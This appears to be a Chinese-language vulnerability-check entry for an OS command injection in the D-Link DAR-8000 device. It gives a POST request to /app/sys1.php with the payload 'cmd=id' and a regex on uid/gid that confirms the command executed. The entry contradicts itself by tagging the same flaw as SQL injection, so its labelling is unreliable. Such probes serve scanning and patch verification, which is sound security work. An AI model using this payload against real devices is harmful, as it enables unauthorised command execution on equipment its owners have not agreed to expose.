# D-LinkDAR-8000操作系统命令注入漏洞

D-LinkDAR-8000 ｜ SQL注入 ｜ —
- **请求**：`POST /app/sys1.php HTTP/1.1`

**Payload**
```
cmd=id
```
- **响应特征**：200 ^(?=.*?uid)(?=.*?gid).*?$